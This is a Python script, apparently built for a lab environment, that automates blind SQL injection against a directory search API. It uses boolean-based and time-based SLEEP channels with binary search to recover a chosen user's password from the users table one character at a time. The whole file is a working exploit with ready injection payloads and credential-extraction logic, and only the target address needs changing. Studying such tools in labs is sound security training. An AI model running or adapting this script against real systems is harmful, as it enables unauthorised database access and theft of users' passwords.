#!/usr/bin/env python3
"""Cardinal — automated BLIND SQL injection extraction.

Demonstrates the "sophisticated" end of SQLi: recovering secret data when the
app returns *no* data and *no* errors — only a yes/no signal. We reconstruct a
user's password one character at a time using binary search, purely from whether
a known row comes back.

Channel (boolean-based blind) on /search's concatenated LIKE:
    q = "Alice%' AND <condition>-- -"
      -> WHERE name LIKE '%Alice%' AND <condition>   (rest commented out)
      -> the "Alice Nguyen" row returns  <=>  <condition> is TRUE

By binary-searching the ASCII value of each character we need ~7 requests per
character instead of ~95, so a full password falls in well under a second's
worth of round-trips.

Usage (from the attacker node):
    python3 /scripts/blind_extract.py                 # extract alice's password
    python3 /scripts/blind_extract.py bob             # a different user
    python3 /scripts/blind_extract.py --mode time     # use the time-based channel
"""
import sys
import time
import urllib.parse
import urllib.request

PROXY = "http://172.30.0.10"
API = PROXY + "/api/directory"


def hexlit(s: str) -> str:
    """MariaDB hex string literal, e.g. alice -> 0x616c696365 (avoids quotes)."""
    return "0x" + s.encode().hex()


def ask_boolean(condition: str) -> bool:
    """True iff the injected condition holds (the 'Alice Nguyen' row returns)."""
    q = f"Alice%' AND ({condition})-- -"
    url = API + "?" + urllib.parse.urlencode({"impl": "concat", "q": q})
    with urllib.request.urlopen(url, timeout=15) as r:
        import json
        rows = json.load(r).get("results", [])
    return any("Alice" in (row.get("name") or "") for row in rows)


def ask_time(condition: str, delay: int = 2) -> bool:
    """True iff the condition holds, inferred from an injected SLEEP delay."""
    inj = (f"zzz' UNION SELECT IF(({condition}),SLEEP({delay}),0),"
           f"2,3,4,5,6,7-- -")
    url = API + "?" + urllib.parse.urlencode({"impl": "concat", "q": inj})
    t0 = time.time()
    try:
        urllib.request.urlopen(url, timeout=delay + 15).read()
    except Exception:
        pass
    return (time.time() - t0) >= delay


def extract(subquery: str, oracle, max_len: int = 64) -> str:
    """Recover the string returned by `subquery`, one char at a time (binary search)."""
    out = []
    for pos in range(1, max_len + 1):
        expr = f"ASCII(SUBSTRING(({subquery}),{pos},1))"
        # length check: a 0 byte means we're past the end of the string
        if not oracle(f"{expr}>0"):
            break
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            if oracle(f"{expr}>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        out.append(chr(lo))
        sys.stdout.write(chr(lo)); sys.stdout.flush()
    return "".join(out)


def main():
    args = sys.argv[1:]
    mode = "boolean"
    if "--mode" in args:
        i = args.index("--mode"); mode = args[i + 1]; del args[i:i + 2]
    user = args[0] if args else "alice"
    oracle = ask_time if mode == "time" else ask_boolean

    print(f"[*] target user: {user}   channel: {mode}-based blind")
    print(f"[*] extracting password (nothing is ever echoed by the app)...")
    subq = f"SELECT password FROM users WHERE username={hexlit(user)}"
    print("    ", end="")
    t0 = time.time()
    secret = extract(subq, oracle)
    dt = time.time() - t0
    print(f"\n[+] recovered: {user} : {secret!r}   in {dt:.1f}s")


if __name__ == "__main__":
    main()
